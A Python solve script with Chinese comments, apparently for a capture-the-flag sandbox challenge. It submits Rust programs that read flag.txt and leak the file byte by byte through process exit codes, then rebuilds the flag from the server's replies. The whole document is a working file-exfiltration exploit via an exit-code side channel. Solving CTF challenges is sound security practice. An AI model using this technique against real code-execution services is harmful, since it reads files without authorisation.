# 导入Python的socket库，用于网络通信
import socket
import time

# --- 你需要配置的参数 ---
HOST = 'challs2.pyjail.club'  # 目标服务器地址
PORT = 21051  # 目标服务器端口
FILENAME = "flag.txt"  # 你要读取的文件名，根据之前的发现，你可能需要改成 "/flag"

# -------------------------

# 用于存放我们一个字节一个字节读出来的flag
flag = ""
# 字节位置的计数器，从0开始
n = 0

print("[*] 开始逐字节读取flag...")

# 这是一个无限循环，直到我们读完所有字节为止
while True:
    try:
        # 1. 构造Payload
        #    我们使用 f-string 来动态地将计数器 n 的值放入Rust代码中
        #    .nth(n) 会获取第n个字节
        payload = f'fn main(){{ std::process::exit( std::fs::read("{FILENAME}").unwrap().into_iter().nth({n}).unwrap() as i32 ) }}'

        # 2. 建立网络连接
        #    每次循环都建立一个新的连接
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))

            # 接收服务器一开始发来的 "gib cod: " 提示符
            s.recv(1024)

            # 3. 发送我们构造好的Payload
            #    注意要编码成bytes并加上换行符
            print(f"[*] 尝试读取第 {n} 个字节...")
            s.sendall(payload.encode() + b'\n')

            # 4. 接收服务器返回的所有数据
            response = b""
            while True:
                data = s.recv(1024)
                if not data:
                    break
                response += data

            response_str = response.decode(errors='ignore')

            # 5. 解析退出码
            if "Exited with status" in response_str:
                # 从 "Exited with status 106" 这样的字符串中提取出数字
                exit_code_str = response_str.split("status")[-1].strip()
                exit_code = int(exit_code_str)

                # 如果退出码是101，说明Rust程序panic了，很可能是因为 .unwrap() 失败
                # 这通常意味着我们已经读取到了文件的末尾
                if exit_code == 101:
                    print("\n[+] 程序panic，可能已读完所有字节。")
                    break

                # 6. 将退出码转换成字符并拼接
                char = chr(exit_code)
                flag += char
                print(f"[+] 成功获取字符: '{char}'")

                # 计数器加1，准备读取下一个字节
                n += 1
            else:
                # 如果没有找到退出码，说明可能出错了
                print(f"[!] 未找到退出码，服务器返回: {response_str}")
                break

        # 加一点延迟，避免太快地给服务器造成压力
        time.sleep(0.1)

    except Exception as e:
        print(f"\n[!] 发生错误: {e}")
        break

print(f"\n[SUCCESS] 最终获取到的Flag是: {flag}")